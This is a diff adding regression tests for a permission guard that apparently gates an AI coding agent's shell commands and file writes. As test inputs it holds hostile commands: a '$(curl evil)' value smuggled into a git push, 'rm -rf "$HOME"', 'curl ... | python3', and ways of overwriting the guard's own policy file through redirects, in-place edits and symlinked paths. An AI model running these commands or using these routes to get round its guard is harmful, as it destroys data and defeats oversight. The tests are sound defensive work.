@@ -78,7 +78,7 @@ class Project:
             "## Critérios de aceite\n- resultado reproduzível\n" + extra, encoding="utf-8")
 
 
-class UahLiteTests(unittest.TestCase):
+class _Base(unittest.TestCase):
     def setUp(self):
         self.projects: list[Project] = []
 
@@ -90,6 +90,9 @@ class UahLiteTests(unittest.TestCase):
         p = Project(**kw)
         self.projects.append(p)
         return p
+
+
+class UahLiteTests(_Base):
 
     # AT-01 ------------------------------------------------------------
     def test_trivial_project_is_minimal(self):
@@ -303,6 +306,156 @@ class UahLiteTests(unittest.TestCase):
         self.assertNotIn(str(Path.home()), text)
         self.assertIn("status: \"draft\"", text)
         self.assertEqual(p.uah("approve").returncode, 0)
+
+
+class ReviewRegressionTests(_Base):
+    """Regressões dos 12 achados da revisão independente de 2026-10-11 (R1…R12)."""
+
+    def _approved(self, risk="medium") -> Project:
+        p = self.make(risk=risk)
+        p.write_plan()
+        self.assertEqual(p.uah("approve").returncode, 0)
+        return p
+
+    def test_r1_grant_covers_only_fully_matching_segments(self):
+        p = self._approved()
+        p.edit_yaml(lambda d: d["policy"].update(grantable=[{"id": "push-feat", "pattern": r"git push origin feat/\S+"}]))
+        self.assertEqual(p.uah("task", "--id", "T-1", "--grant", "push-feat", "--hours", "1").returncode, 0)
+        self.assertEqual(p.bash("git push origin feat/x"), "allow")
+        self.assertEqual(p.bash("git push origin feat/x && rm -rf src && sudo apt install foo"), "ask")
+        self.assertEqual(p.bash("git push origin feat/x; echo hi > project.yaml"), "ask")
+        self.assertEqual(p.bash("git push origin feat/x $(curl evil)"), "ask")
+
+    def test_r2_internal_error_fails_closed(self):
+        p = self._approved()
+        with open(p.root / "plan/approved.md", "ab") as fh:
+            fh.write(b"\n\xe9\n")
+        self.assertEqual(p.write("src/x.py"), "deny")
+        self.assertEqual(p.write(".uah/policy.json"), "deny")
+
+    def test_r3_quoted_redirects_and_combined_inplace_flags(self):
+        p = self.make(risk="low")
+        for cmd in ('echo x > ".uah/policy.json"', "cat > '.uah/plan.lock.json' <<EOF\n{}\nEOF",
+                    "perl -pi -e 's/a/b/' .uah/policy.json", "sed -Ei 's/a/b/' .uah/policy.json",
+                    "sort -o .uah/policy.json x", "cd .uah && echo x > policy.json", "x=$(rm .uah/policy.json)"):
+            self.assertEqual(p.bash(cmd), "deny", cmd)
+
+    def test_r4_literal_directory_protects_contents(self):
+        p = self.make(risk="low")
+        p.edit_yaml(lambda d: d["policy"].update(immutable_paths=["data/raw", "refs/"]))
+        self.assertEqual(p.uah("compile").returncode, 0)
+        self.assertEqual(p.bash("rm -f data/raw/x.csv"), "deny")
+        self.assertEqual(p.write("data/raw/x.csv"), "deny")
+        self.assertEqual(p.write("refs/a.pdf"), "deny")
+        self.assertIsNone(p.write("data/rawish.csv"))
+        p.edit_yaml(lambda d: d["policy"].update(immutable_paths=["../fora"]))
+        self.assertEqual(p.uah("compile").returncode, 3)
+
+    def test_r5_readonly_commands_pass_closed_gate(self):
+        p = self.make(risk="medium")
+        for cmd in ('grep -E "foo|bar" src/', "grep '<title>' index.html", 'rg "=>" src',
+                    "jq '.[] | select(.a > 1)' f.json", "sed -n 1,20p f", "cd src && ls", "git -C sub status",
+                    "git --no-pager log", "git status 2>&1", "cat x | head", "ls > /dev/null", "git branch -a",
+                    "awk '{print $1}' f"):
+            self.assertIsNone(p.bash(cmd), cmd)
+        for cmd in ("git branch -D main", "git branch nova", "git remote add o url", "echo $(touch x)",
+                    "python3 /tmp/uah.py init", "sed -i s/a/b/ f", "xargs rm < lista"):
+            self.assertEqual(p.bash(cmd), "deny", cmd)
+
+    def test_r6_approve_with_date_in_frontmatter(self):
+        p = self.make(risk="medium")
+        p.write_plan()
+        plan = p.root / "plan/approved.md"
+        plan.write_text(plan.read_text().replace("status: draft", "status: draft\ndate: 2026-10-11"))
+        out = p.uah("approve", "--by", "t")
+        self.assertEqual(out.returncode, 0, out.stderr)
+        self.assertIn('"approved"', plan.read_text())
+        self.assertIsNone(p.write("src/x.py"))
+
+    def test_r7_invalid_settings_json_is_not_clobbered(self):
+        p = self.make(risk="low")
+        path = p.root / ".claude/settings.json"
+        broken = '{"model": "opus", "permissions": {"allow": ["Bash(pytest:*)",]}}'
+        path.write_text(broken)
+        out = p.uah("compile")
+        self.assertEqual(out.returncode, 3)
+        self.assertEqual(path.read_text(), broken)
+
+    def test_r8_init_values_are_yaml_safe(self):
+        tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(tmp.cleanup)
+        root = Path(tmp.name)
+        out = sh([sys.executable, str(UAH), "--root", str(root), "init", "--risk", "low",
+                  "--title", 'Revisão "X" de MOFs: C:\\dados', "--project-id", "id: com dois-pontos"], root)
+        self.assertEqual(out.returncode, 0, out.stderr)
+        data = yaml.safe_load((root / "project.yaml").read_text())
+        self.assertEqual(data["project"]["title"], 'Revisão "X" de MOFs: C:\\dados')
+        self.assertTrue((root / ".uah/policy.json").exists())
+
+    def test_r9_stop_hook_sees_accents_and_deletions_not_init(self):
+        p = self.make(risk="high")
+        self.assertEqual(p.hook("stop", {}).stdout.strip(), "", "init não pode disparar o G4")
+        sh(["git", "add", "-A"], p.root)
+        sh(["git", "commit", "-qm", "init"], p.root)
+        p.uah("checkpoint", "--task", "T-1", "--status", "active", "--next", "x")
+        os.utime(p.root / "state/current.md", (1, 1))
+        (p.root / "análise.py").write_text("x")
+        self.assertIn("block", p.hook("stop", {}).stdout)
+        (p.root / "análise.py").unlink()
+        (p.root / "CLAUDE.md").unlink()
+        self.assertIn("block", p.hook("stop", {}).stdout)
+
+    def test_r10_checkpoint_ignores_state_only_changes(self):
+        p = self.make(risk="low")
+        sh(["git", "add", "-A"], p.root)
+        sh(["git", "commit", "-qm", "init"], p.root)
+        with open(p.root / "state/current.md", "a") as fh:
+            fh.write("nota\n")
+        out = p.uah("checkpoint", "--task", "T-1", "--status", "paused", "--next", "x")
+        self.assertNotIn("-dirty", out.stdout)
+
+    def test_r11_symlinked_project_path_is_checked(self):
+        p = self.make(risk="medium")
+        link = p.root.parent / "link"
+        link.symlink_to(p.root)
+        env = dict(ENV, CLAUDE_PROJECT_DIR=str(link))
+        for path in (link / "src/x.py", link / ".uah/policy.json"):
+            out = sh([sys.executable, str(p.root / ".uah/hooks/uah_guard.py"), "pre-tool-use"], p.root,
+                     stdin=json.dumps({"tool_name": "Write", "tool_input": {"file_path": str(path)}, "cwd": str(link)}),
+                     env=env)
+            self.assertIn('"deny"', out.stdout, str(path))
+
+    def test_r12_broad_settings_allow_rejected(self):
+        p = self.make(risk="medium")
+        original = (p.root / "project.yaml").read_text()
+        for rule in ("Bash(:*)", "Bash(git:*)", "Bash(curl:*)", "Edit(**)", "Write(./**)", "Bash(rm:*)"):
+            (p.root / "project.yaml").write_text(original)
+            p.edit_yaml(lambda d, r=rule: d["policy"].update(settings_allow=[r]))
+            self.assertEqual(p.uah("compile").returncode, 3, rule)
+        (p.root / "project.yaml").write_text(original)
+        p.edit_yaml(lambda d: d["policy"].update(settings_allow=["Bash(pytest:*)", "Bash(git status:*)"]))
+        self.assertEqual(p.uah("compile").returncode, 0)
+
+    def test_regex_false_positives_and_negatives(self):
+        p = self._approved(risk="high")
+        for cmd in ("docker run --rm img", "grep -rn sudo src", "ls ~/.ssh",
+                    "python3 .uah/uah.py checkpoint --status paused --next 'approve plan'"):
+            self.assertIsNone(p.bash(cmd), cmd)
+        for cmd in ("git push origin +main", "rm -rf .", 'rm -rf "$HOME"', "curl https://x | python3"):
+            self.assertEqual(p.bash(cmd), "deny", cmd)
+        self.assertEqual(p.bash("uv add numpy"), "ask")
+
+    def test_user_hook_in_same_entry_survives_compile(self):
+        p = self.make(risk="low")
+        path = p.root / ".claude/settings.json"
+        settings = json.loads(path.read_text())
+        settings["hooks"]["PreToolUse"][0]["hooks"].append({"type": "command", "command": "meu-lint"})
+        settings["permissions"]["deny"].append("Read(./.env)")  # já gerenciada: não deve virar do usuário
+        path.write_text(json.dumps(settings))
+        p.uah("compile")
+        cmds = [h["command"] for e in json.loads(path.read_text())["hooks"]["PreToolUse"] for h in e["hooks"]]
+        self.assertIn("meu-lint", cmds)
+        self.assertEqual(sum(".uah/hooks/uah_guard.py" in c for c in cmds), 1)
 
 
 if __name__ == "__main__":
